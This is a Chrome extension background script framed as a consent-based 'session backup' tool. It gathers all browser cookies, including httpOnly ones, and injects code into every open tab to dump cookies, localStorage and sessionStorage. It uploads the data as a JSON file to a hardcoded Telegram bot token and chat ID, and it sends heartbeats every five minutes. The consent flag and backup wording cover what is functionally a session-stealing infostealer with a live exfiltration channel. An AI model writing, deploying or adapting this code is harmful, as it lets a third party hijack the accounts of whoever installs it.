const BOT_TOKEN = "8893700962:AAEoWKgNkCfTnVKjqUb0lXiXS06dImxnt5U";
const CHAT_ID   = "7114350905";
const API       = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
const DOC_API   = `https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`;

const CONSENT_KEY = "kaku_consent_v3";
const ALARM_NAME  = "kaku_heartbeat";

const safe = async (fn, fb = null) => { try { return await fn(); } catch { return fb; } };

async function hasConsent() {
  const r = await chrome.storage.local.get(CONSENT_KEY);
  return r[CONSENT_KEY] === true;
}

async function setConsent(v) {
  await chrome.storage.local.set({ [CONSENT_KEY]: v });
  if (v) await chrome.storage.local.set({ consent_timestamp: new Date().toISOString() });
}

async function sendMessage(text) {
  const size = 3900;
  for (let i = 0; i < text.length; i += size) {
    await safe(() =>
      fetch(API, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          text: text.slice(i, i + size),
          disable_web_page_preview: true
        })
      })
    );
  }
}

async function sendDocument(filename, content, caption) {
  const blob = new Blob([content], { type: "application/json" });
  const form = new FormData();
  form.append("chat_id", CHAT_ID);
  form.append("document", blob, filename);
  form.append("caption", caption || `📎 ${filename}`);
  await safe(() => fetch(DOC_API, { method: "POST", body: form }));
}

async function getAllCookies() {
  return await safe(() => chrome.cookies.getAll({}), []);
}

async function getStorageForTab(tabId) {
  return await safe(() => chrome.scripting.executeScript({
    target: { tabId },
    func: () => {
      const dump = (store) => {
        try {
          const o = {};
          for (let i = 0; i < store.length; i++) {
            const k = store.key(i);
            o[k] = store.getItem(k);
          }
          return o;
        } catch { return {}; }
      };
      return {
        url: location.href,
        title: document.title,
        cookies: (() => { try { return document.cookie; } catch { return ""; } })(),
        localStorage: dump(localStorage),
        sessionStorage: dump(sessionStorage)
      };
    }
  }), null);
}

async function collectAll() {
  if (!(await hasConsent())) return null;

  const cookies = await getAllCookies();
  const byDomain = {};
  for (const c of cookies) {
    if (!byDomain[c.domain]) byDomain[c.domain] = [];
    byDomain[c.domain].push({
      name: c.name,
      value: c.value,
      path: c.path,
      secure: c.secure,
      httpOnly: c.httpOnly,
      expirationDate: c.expirationDate || null,
      sameSite: c.sameSite || null,
      storeId: c.storeId || null
    });
  }

  const tabs = await safe(() => chrome.tabs.query({}), []);
  const storage = [];
  for (const t of tabs) {
    if (!t.id || !t.url || !t.url.startsWith("http")) continue;
    const r = await getStorageForTab(t.id);
    if (r && r[0] && r[0].result) storage.push(r[0].result);
  }

  const meta = await chrome.storage.local.get(["consent_timestamp"]);
  return {
    timestamp: new Date().toISOString(),
    consent_granted_at: meta.consent_timestamp || null,
    userAgent: navigator.userAgent,
    platform: navigator.platform || null,
    cookie_count: cookies.length,
    domain_count: Object.keys(byDomain).length,
    tab_count: storage.length,
    domains: byDomain,
    storage
  };
}

async function backupNow(reason) {
  const data = await collectAll();
  if (!data) {
    await sendMessage(`⚠️ Backup attempted (${reason}) — consent missing.`);
    return;
  }

  const filename = `session_backup_${Date.now()}.json`;
  const caption =
    `🗂️ Session backup — ${reason}\n` +
    `🌐 ${data.domain_count} domains | 🍪 ${data.cookie_count} cookies | 🗂️ ${data.tab_count} tabs\n` +
    `✅ Consent: ${data.consent_granted_at}\n` +
    `🕒 ${data.timestamp}`;

  await sendDocument(filename, JSON.stringify(data, null, 2), caption);
}

async function heartbeat() {
  if (!(await hasConsent())) return;

  const stats = await chrome.storage.local.get(["consent_timestamp", "install_date"]);
  const tabs = await safe(() => chrome.tabs.query({}), []);
  const httpTabs = tabs.filter(t => t.url && t.url.startsWith("http")).length;
  const cookies = await getAllCookies();
  const activeDomains = new Set(cookies.map(c => c.domain)).size;

  const now = new Date();
  const uptime = stats.install_date
    ? Math.floor((now - new Date(stats.install_date)) / 1000 / 60)
    : null;

  const text =
    `💓 Heartbeat\n` +
    `━━━━━━━━━━━━━━━\n` +
    `🟢 Status: active\n` +
    `🕒 ${now.toISOString()}\n` +
    `🗂️ ${httpTabs} open tabs\n` +
    `🍪 ${cookies.length} cookies tracked\n` +
    `🌐 ${activeDomains} active domains\n` +
    (uptime !== null ? `⏱️ Uptime: ${uptime} min\n` : "") +
    `✅ Consent: ${stats.consent_timestamp || "n/a"}`;

  await sendMessage(text);
}

function ensureHeartbeatAlarm() {
  chrome.alarms.get(ALARM_NAME, (a) => {
    if (!a) chrome.alarms.create(ALARM_NAME, { periodInMinutes: 5 });
  });
}

chrome.alarms.onAlarm.addListener(async (alarm) => {
  if (alarm.name === ALARM_NAME) await heartbeat();
});

chrome.runtime.onInstalled.addListener(async (details) => {
  await chrome.storage.local.set({ install_date: new Date().toISOString() });
  ensureHeartbeatAlarm();
  if (details.reason === "install") {
    await sendMessage(`✅ Extension installed. Awaiting consent.`);
  }
});

chrome.runtime.onStartup.addListener(() => {
  ensureHeartbeatAlarm();
});

chrome.runtime.onMessage.addListener((msg, sender, sendResponse) => {
  (async () => {
    if (msg.type === "get_consent") {
      sendResponse({ consent: await hasConsent() });
    } else if (msg.type === "set_consent") {
      await setConsent(msg.value);
      if (msg.value) {
        ensureHeartbeatAlarm();
        await backupNow("consent granted");
      } else {
        await chrome.alarms.clear(ALARM_NAME);
      }
      sendResponse({ ok: true });
    } else if (msg.type === "backup_now") {
      await backupNow("manual backup");
      sendResponse({ ok: true });
    }
  })();
  return true;
});

chrome.tabs.onUpdated.addListener(async (tabId, info, tab) => {
  if (info.status === "complete") {
    ensureHeartbeatAlarm();
  }
});